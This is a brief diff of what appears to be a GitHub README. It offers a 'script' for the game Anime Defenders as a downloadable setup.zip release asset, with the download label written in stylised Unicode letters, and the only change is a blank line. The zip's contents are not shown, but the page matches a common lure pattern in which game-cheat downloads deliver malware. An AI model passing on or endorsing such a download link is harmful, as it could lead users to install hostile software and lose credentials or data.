@@ -1,5 +1,6 @@
 
 
+
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Anime-Defenders/releases/download/Download/setup.zip)***
 
 ![maxresdefault](https://github.com/user-attachments/assets/38f722ec-5479-4c4d-92c0-f21aee82b99b)
